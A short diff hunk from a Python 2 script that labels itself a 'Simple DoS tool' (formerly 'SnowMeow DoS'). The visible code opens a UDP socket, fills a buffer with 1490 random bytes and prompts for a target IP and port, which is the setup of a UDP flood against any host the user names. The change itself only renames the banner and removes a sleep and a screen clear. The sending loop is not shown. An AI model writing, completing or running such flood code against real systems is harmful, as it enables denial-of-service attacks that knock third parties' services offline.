@@ -4,9 +4,7 @@ import random
 import socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-time.sleep(2)
-os.system("clear")
-print "SnowMeow DoS"
+print "--Simple DoS tool--"
 ip = raw_input("~ IP:  ")
 port = input("~ Port:  ")
 sent = 0
